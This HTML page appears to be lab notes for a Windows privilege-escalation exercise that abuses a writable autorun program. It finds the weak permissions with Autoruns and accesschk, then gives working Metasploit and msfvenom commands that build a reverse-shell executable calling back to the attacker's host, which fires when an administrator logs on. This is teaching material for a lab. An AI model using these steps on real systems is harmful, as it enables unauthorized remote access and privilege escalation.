<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Overview (Autorun)</title>
</head><body><b><div style="text-align: center"><span style="font-size: 20pt"><span style="color: #ffa300">Detection</span></span></div></b><span style="font-size: 15pt"><br/>
</span><span style="font-size: 15pt"><br/>
Windows VM<br/>
<br/>
1. Open command prompt and type:<br/>
<i><b>C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe</b></i><br/>
2. In Autoruns, click on the <b>‘Logon’</b>&nbsp;tab.<br/>
3. From the listed results, notice that the <b>“My Program”</b>&nbsp;entry is pointing<br/>
to <b>“C:\Program Files\Autorun Program\program.exe”.</b><br/>
4. In command prompt type:<br/>
<b>C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"</b><br/>
5. From the output, notice that the <b>“Everyone”</b>&nbsp;user group has <b>“FILE_ALL_ACCESS”</b>&nbsp;permission on the <b>“program.exe”</b>&nbsp;file.<br/>
<br/>
<br/>
<br/>
</span><span style="color: #ff0000"><span style="font-size: 20pt"><div style="text-align: center"><b>Exploitation</b></div></span></span><span style="font-size: 15pt"><br/>
</span><span style="font-size: 15pt"><br/>
<b>Kali VM</b><br/>
<br/>
1. Open command prompt and type: <b>msfconsole</b><br/>
2. In Metasploit <b>(msf &gt; prompt): use multi/handler</b><br/>
3. In Metasploit <b>(msf &gt; prompt): set payload windows/meterpreter/reverse_tcp</b><br/>
4. In Metasploit <b>(msf &gt; prompt): set lhost <i>[Kali VM IP Address]</i></b><br/>
5. In Metasploit <b>(msf &gt; prompt): run</b><br/>
6. Open an additional command prompt and type:<br/>
<b>msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe -o program.exe</b><br/>
7. Copy the generated file, program.exe, to the Windows VM.<br/>
<br/>
<br/>
<br/>
</span><span style="font-size: 16pt"><div style="text-align: left"><b>Windows VM</b></div></span><br/>
<span style="font-size: 15pt"><br/>
1. Place program.exe in <b>‘C:\Program Files\Autorun Program’.</b><br/>
2. To simulate the privilege escalation effect, logoff and then log back on as an administrator user.<br/>
<br/>
<br/>
<br/>
</span><div style="text-align: left"><span style="font-size: 16pt"><b>Kali VM</b></span></div><span style="font-size: 15pt"><br/>
</span><span style="font-size: 15pt"><br/>
1. Wait for a new session to open in Metasploit.<br/>
2. In Metasploit <b>(msf &gt; prompt): sessions -i <i>[Session ID]</i></b><br/>
3. To confirm that the attack succeeded, in Metasploit <b>(msf &gt; prompt): getuid<br/>
</b></span></body></html>